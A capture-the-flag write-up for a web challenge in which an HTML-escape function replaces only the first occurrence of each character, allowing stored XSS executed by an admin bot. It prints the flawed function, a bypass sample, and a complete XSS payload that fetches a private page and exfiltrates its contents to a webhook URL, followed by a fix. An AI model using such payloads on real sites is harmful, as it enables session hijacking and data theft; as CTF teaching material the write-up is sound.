# web/job-board writeup

## Summary
The site lets anyone submit job applications, and an admin bot (logged in as the recruiter) visits submitted application URLs. The app attempts to HTML-escape user input, but the escape function only replaces the **first** occurrence of each character. This allows a stored XSS by placing a harmless tag first and a malicious tag second. When the admin bot visits the application page, the XSS runs in the admin session and can fetch the private job (which contains the flag) and exfiltrate it.

## Recon
Key files:
- `app.js` handles routes and templates.
- `admin-bot.js` shows the bot logs in as `admin` and then visits the submitted URL.
- `site/application.html` renders the application content.

Relevant code (simplified):
- Applications are stored in memory and rendered on `/application/:id`.
- User input is passed through `htmlEscape()` before insertion.

## Bug: broken HTML escaping
`htmlEscape()` uses `String.replace` without a global regex:

```js
function htmlEscape(s, quote=true) {
  s = s.replace("&", "&amp;");
  s = s.replace("<", "&lt;");
  s = s.replace(">", "&gt;");
  if (quote) {
    s = s.replace('"', "&quot;");
    s = s.replace("'", "&#x27;");
  }
  return s;
}
```

`String.replace` only replaces the **first** occurrence, so the first `<` is escaped but the second `<` is not.

Example:
```
<x><img src=x onerror=alert(1)>
```
becomes:
```
&lt;x&gt;<img src=x onerror=alert(1)>
```
The `<img>` tag survives and runs.

Because the application page displays `why` verbatim (after this broken escape), this is a stored XSS.

## Exploit plan
1. Submit a public job application with an XSS payload in the “Why/Bio/Resume” field.
2. Send the resulting `/application/<id>` URL to the admin bot.
3. The bot logs in, visits the URL, and the XSS runs with recruiter privileges.
4. Use XSS to request `/` to extract job IDs, then request the last (private) job, parse the flag from its description, and exfiltrate it.

## Payload
### WEBHOOK
Use https://webhook.site/ to get a webhook url and replace that with the YOUR-WEBHOOK to receive the flag when the link is visited.

```html
'<x><img src=x onerror='fetch(`/`).then(r=>r.text()).then(t=>{const ids=[...t.matchAll(/\/job\/([0-9a-f-]{36})/g)].map(m=>m[1]);const id=ids[ids.length-1];return fetch(`/job/${id}`)}).then(r=>r.text()).then(t=>{const flag=t.match(/lactf\{[^}]+\}/)[0];(new Image()).src=`https://YOUR-WEBHOOK/?f=${encodeURIComponent(flag)}`})'>
```

Submit it as the application “Why/Bio/Resume” and you will see it would say visited then check the url for the webhook.

## Why this works
- The XSS survives because only the first `<` is escaped.
- The admin bot is authenticated, so it can see private jobs.
- The private job description embeds the flag in plaintext.

## Fix
- Use a proper escaping library or use global replaces:
  - `s = s.replaceAll("&", "&amp;")` etc.
- Prefer a templating engine with built-in escaping.

